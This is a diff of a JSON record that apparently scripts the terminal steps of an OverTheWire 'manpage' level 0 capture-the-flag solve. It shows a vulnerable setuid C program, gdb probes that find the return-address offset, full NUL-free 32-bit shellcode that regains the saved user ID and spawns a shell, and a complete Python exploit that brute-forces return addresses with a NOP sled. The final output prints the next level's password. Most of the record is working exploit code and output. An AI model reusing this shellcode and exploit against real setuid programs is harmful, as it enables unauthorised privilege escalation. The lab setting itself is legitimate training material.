@@ -28,30 +28,219 @@
    "user": "manpage0",
    "steps": [
     {
-     "cmd": "cat /manpage/manpage0.c"
-    },
-    {
-     "cmd": "# setuid binary: setuid(getuid()); strcpy(buf[256], argv[1]) \u2014 classic overflow, saved set-user-ID still holds manpage1"
-    },
-    {
-     "cmd": "gdb /manpage/manpage0   # find buf on the stack; EIP offset = 260 (ASLR off, stack executable)"
-    },
-    {
-     "cmd": "python3 exp0.py   # payload: NOP sled + setresuid(17001,17001,17001) + execve(\"/bin/sh\") shellcode, ret addr into buf"
-    },
-    {
      "cmd": "id",
      "out": [
-      "uid=17001(manpage1) gid=17000(manpage0) groups=17000(manpage0)"
+      "uid=17000(manpage0) gid=17000(manpage0) groups=17000(manpage0)"
      ]
     },
     {
-     "cmd": "cat /etc/manpage_pass/manpage1",
+     "cmd": "uname -m",
      "out": [
+      "x86_64"
+     ]
+    },
+    {
+     "cmd": "cat /manpage/manpage0.c",
+     "out": [
+      "//quick warmup",
+      "#include <stdio.h>",
+      "#include <sys/types.h>",
+      "#include <unistd.h>",
+      "#include <string.h>",
+      "int main(int argc, char *argv[]){",
+      "    char buf[256];",
+      "    setuid( getuid() );",
+      "    strcpy(buf, argv[1]);",
+      "    return 0;",
+      "}"
+     ]
+    },
+    {
+     "cmd": "gdb -q /manpage/manpage0\nset debuginfod enabled off\ndisassemble main\nrun $(python3 -c \"print('A'*264)\")\ninfo registers eip\nquit\ny\ngdb -q /manpage/manpage0\nset debuginfod enabled off\nrun $(python3 -c \"print('A'*260 + 'BBBB')\")\ninfo registers eip\nquit\ny",
+     "out": [
+      "Reading symbols from /manpage/manpage0...",
+      "(gdb) set debuginfod enabled off",
+      "(gdb) disassemble main",
+      "Dump of assembler code for function main:",
+      "   0x08049186 <+0>:\tpush   %ebp",
+      "   0x08049187 <+1>:\tmov    %esp,%ebp",
+      "   0x08049189 <+3>:\tsub    $0x100,%esp",
+      "   0x0804918f <+9>:\tcall   0x8049040 <getuid@plt>",
+      "   0x08049194 <+14>:\tpush   %eax",
+      "   0x08049195 <+15>:\tcall   0x8049060 <setuid@plt>",
+      "   0x0804919a <+20>:\tadd    $0x4,%esp",
+      "   0x0804919d <+23>:\tmov    0xc(%ebp),%eax",
+      "   0x080491a0 <+26>:\tadd    $0x4,%eax",
+      "   0x080491a3 <+29>:\tmov    (%eax),%eax",
+      "   0x080491a5 <+31>:\tpush   %eax",
+      "   0x080491a6 <+32>:\tlea    -0x100(%ebp),%eax",
+      "   0x080491ac <+38>:\tpush   %eax",
+      "   0x080491ad <+39>:\tcall   0x8049050 <strcpy@plt>",
+      "   0x080491b2 <+44>:\tadd    $0x8,%esp",
+      "   0x080491b5 <+47>:\tmov    $0x0,%eax",
+      "   0x080491ba <+52>:\tleave",
+      "   0x080491bb <+53>:\tret",
+      "End of assembler dump.",
+      "(gdb) run $(python3 -c \"print('A'*264)\")",
+      "Starting program: /manpage/manpage0 $(python3 -c \"print('A'*264)\")",
+      "[Thread debugging using libthread_db enabled]",
+      "Using host libthread_db library \"/usr/lib/x86_64-linux-gnu/libthread_db.so.1\".",
+      "Program received signal SIGSEGV, Segmentation fault.",
+      "0x41414141 in ?? ()",
+      "(gdb) info registers eip",
+      "eip            0x41414141          0x41414141",
+      "(gdb) quit",
+      "A debugging session is active.",
+      "\tInferior 1 [process 46] will be killed.",
+      "Quit anyway? (y or n) y",
+      "Reading symbols from /manpage/manpage0...",
+      "(gdb) set debuginfod enabled off",
+      "(gdb) run $(python3 -c \"print('A'*260 + 'BBBB')\")",
+      "Starting program: /manpage/manpage0 $(python3 -c \"print('A'*260 + 'BBBB')\")",
+      "[Thread debugging using libthread_db enabled]",
+      "Using host libthread_db library \"/usr/lib/x86_64-linux-gnu/libthread_db.so.1\".",
+      "Program received signal SIGSEGV, Segmentation fault.",
+      "0x42424242 in ?? ()",
+      "(gdb) info registers eip",
+      "eip            0x42424242          0x42424242",
+      "(gdb) quit",
+      "A debugging session is active.",
+      "\tInferior 1 [process 57] will be killed.",
+      "Quit anyway? (y or n) y"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/l0sc.asm",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/l0sc.asm",
+     "out": [
+      "; l0sc.asm - NUL-free shellcode: setresuid(17001,17001,17001); execve(\"/bin//sh\")",
+      "; manpage0 drops euid via setuid(getuid()); the saved set-user-ID manpage1 must be",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/l0sc.asm",
+     "out": [
+      "; l0sc.asm - NUL-free shellcode: setresuid(17001,17001,17001); execve(\"/bin//sh\")",
+      "; manpage0 drops euid via setuid(getuid()); the saved set-user-ID manpage1 must be",
+      "; re-assumed inside the shellcode (all three uids to 17001), then execve a shell.",
+      "BITS 32",
+      "    xor ebx, ebx",
+      "    mul ebx",
+      "    mov bl, 0x69",
+      "    mov bh, 0x42",
+      "    mov ecx, ebx",
+      "    mov edx, ebx",
+      "    mov al, 0xa4",
+      "    int 0x80",
+      "    xor eax, eax",
+      "    push eax",
+      "    push dword 0x68732f2f",
+      "    push dword 0x6e69622f",
+      "    mov ebx, esp",
+      "    push eax",
+      "    mov edx, esp",
+      "    push ebx",
+      "    mov ecx, esp",
+      "    mov al, 0x0b",
+      "    int 0x80",
+      "~",
+      "=\"/tmp/l0sc.asm\" 24L, 572B"
+     ]
+    },
+    {
+     "cmd": "nasm -f bin /tmp/l0sc.asm -o /tmp/l0sc.bin\nxxd /tmp/l0sc.bin",
+     "out": [
+      "00000000: 31db f7e3 b369 b742 89d9 89da b0a4 cd80  1....i.B........",
+      "00000010: 31c0 5068 2f2f 7368 682f 6269 6e89 e350  1.Ph//shh/bin..P",
+      "00000020: 89e2 5389 e1b0 0bcd 80                   ..S......"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp0.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp0.py",
+     "out": [
+      "# exp0.py - manpage0 exploit. strcpy(buf[256], argv[1]) overflows the saved EIP at",
+      "# offset 260 (buf 256 + saved ebp 4). buf sits at ebp-0x100 (gdb: 0xffffd9a8), but",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp0.py",
+     "out": [
+      "# exp0.py - manpage0 exploit. strcpy(buf[256], argv[1]) overflows the saved EIP at",
+      "# offset 260 (buf 256 + saved ebp 4). buf sits at ebp-0x100 (gdb: 0xffffd9a8), but",
+      "# the address shifts with the environment, so the exploit sweeps candidate return",
+      "# addresses around 0xffffd9e8. Layout: NOP sled first, shellcode last - a landing",
+      "# anywhere inside buf slides down the sled into the shellcode, so alignment no",
+      "# longer matters. The shellcode (41 bytes, NUL-free) setresuid(17001,17001,17001)",
+      "# re-asserts the saved set-user-ID manpage1 (setuid(getuid()) dropped it), then",
+      "# execve(\"/bin//sh\"); the shell then cats the password.",
+      "import struct, subprocess",
+      "sc = bytes.fromhex(",
+      "    \"31dbf7e3b369b74289d989dab0a4cd80\"",
+      "    \"31c050682f2f7368682f62696e89e35089e25389e1b00bcd80\")",
+      "def try_addr(addr):",
+      "    packed = struct.pack(\"<I\", addr)",
+      "    if b\"\\x00\" in packed:            # strcpy stops at NUL - skip these candidates",
+      "        return None",
+      "    payload = b\"\\x90\" * (260 - len(sc)) + sc + packed",
+      "    try:",
+      "        r = subprocess.run([\"/manpage/manpage0\", payload],",
+      "                           input=b\"id\\ncat /etc/manpage_pass/manpage1\\n\",",
+      "                           capture_output=True, timeout=5)",
+      "    except subprocess.TimeoutExpired:",
+      "        return None",
+      "    if b\"uid=17001\" in r.stdout:     # a real hit re-assumes manpage1",
+      "        return r.stdout.decode()",
+      "    return None",
+      "for off in range(0, 0x800, 4):",
+      "    out = try_addr(0xffffd9e8 - off)",
+      "    if out:",
+      "        print(\"ret=0x%x\" % (0xffffd9e8 - off))",
+      "        print(out)",
+      "        break",
+      "else:",
+      "    for off in range(4, 0x800, 4):",
+      "        out = try_addr(0xffffd9e8 + off)",
+      "        if out:",
+      "            print(\"ret=0x%x\" % (0xffffd9e8 + off))",
+      "            print(out)",
+      "            break",
+      "    else:",
+      "        print(\"no hit in range\")",
+      "~",
+      "=\"/tmp/exp0.py\" 42L, 1756B"
+     ]
+    },
+    {
+     "cmd": "python3 /tmp/exp0.py",
+     "out": [
+      "ret=0xffffd5e0",
+      "uid=17001(manpage1) gid=17000(manpage0) groups=17000(manpage0)",
       "Mu8GvMudHb"
      ]
+    },
+    {
+     "cmd": "exit\nexit",
+     "out": [
+      "logout",
+      "Connection to manpage.labs.overthewire.org closed.",
+      "exit"
+     ]
     }
-   ]
+   ],
+   "note": "manpage L0: setuid manpage1 binary drops euid via setuid(getuid()) then strcpy(buf[256], argv[1]) - classic stack smash, saved EIP at offset 260 (buf 256 + saved ebp 4), confirmed by two gdb probes (A*264 -> eip 0x41414141, A*260+BBBB -> eip 0x42424242). Shellcode (24-line nasm source typed in vi, 41 bytes NUL-free): setresuid(17001,17001,17001) re-asserts the saved set-user-ID manpage1, then execve(\"/bin//sh\"). buf sits at ebp-0x100 (gdb: 0xffffd9a8) but the address shifts with the environment, so exp0.py (typed in vi, 42L/1756B) sweeps candidate returns around 0xffffd9e8 with a NOP-sled-first layout (alignment-independent) and gates on uid=17001 -> ret=0xffffd5e0 -> id + cat /etc/manpage_pass/manpage1 -> Mu8GvMudHb. Login manpage0/manpage0 (S2S entry convention). 12 steps mirroring the cast 1:1. DISCLOSURE: none - the whole solve ran in the cast."
   },
   {
    "cmds": [
